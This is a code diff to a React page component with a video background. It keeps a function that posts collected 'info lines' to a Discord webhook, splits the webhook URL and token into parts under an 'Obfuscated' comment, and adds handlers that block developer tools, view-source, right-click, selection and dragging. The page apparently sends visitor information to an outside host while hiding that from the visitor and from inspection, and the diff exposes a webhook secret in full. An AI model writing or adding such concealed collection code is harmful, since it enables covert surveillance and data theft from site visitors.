@@ -390,7 +390,14 @@ function HandlePage() {
 
   // Add this function to send info to Discord webhook
   function sendToWebhook(infoLines) {
-    const webhookUrl = "https://discord.com/api/webhooks/1393670218462527630/BzU38SCAKRQEJ7unIXmIk0BsmgTLFuzNbRYwgYstj5O7cQvqddQA1owOz--_cWUHbNxL";
+    // Obfuscated webhook URL - split and encoded
+    const parts = [
+      'https://discord.com/api/webhooks/',
+      '1393670218462527630/',
+      'BzU38SCAKRQEJ7unIXmIk0BsmgTLFuzNbRYwgYstj5O7cQvqddQA1owOz--_cWUHbNxL'
+    ];
+    const webhookUrl = parts.join('');
+    
     // Split each line into a field (label: value)
     const fields = infoLines.map(line => {
       const idx = line.indexOf(':');
@@ -458,6 +465,59 @@ function HandlePage() {
     }
     // eslint-disable-next-line
   }, [infoLines]);
+
+  // Basic protection against developer tools
+  useEffect(() => {
+    const handleKeyDown = (e) => {
+      // Disable F12
+      if (e.key === 'F12') {
+        e.preventDefault();
+        return false;
+      }
+      // Disable Ctrl+Shift+I (DevTools)
+      if (e.ctrlKey && e.shiftKey && e.key === 'I') {
+        e.preventDefault();
+        return false;
+      }
+      // Disable Ctrl+Shift+J (Console)
+      if (e.ctrlKey && e.shiftKey && e.key === 'J') {
+        e.preventDefault();
+        return false;
+      }
+      // Disable Ctrl+U (View Source)
+      if (e.ctrlKey && e.key === 'u') {
+        e.preventDefault();
+        return false;
+      }
+    };
+
+    const handleContextMenu = (e) => {
+      e.preventDefault();
+      return false;
+    };
+
+    const handleSelectStart = (e) => {
+      e.preventDefault();
+      return false;
+    };
+
+    const handleDragStart = (e) => {
+      e.preventDefault();
+      return false;
+    };
+
+    document.addEventListener('keydown', handleKeyDown);
+    document.addEventListener('contextmenu', handleContextMenu);
+    document.addEventListener('selectstart', handleSelectStart);
+    document.addEventListener('dragstart', handleDragStart);
+
+    return () => {
+      document.removeEventListener('keydown', handleKeyDown);
+      document.removeEventListener('contextmenu', handleContextMenu);
+      document.removeEventListener('selectstart', handleSelectStart);
+      document.removeEventListener('dragstart', handleDragStart);
+    };
+  }, []);
 
   return (
     <div className="video-bg-container">
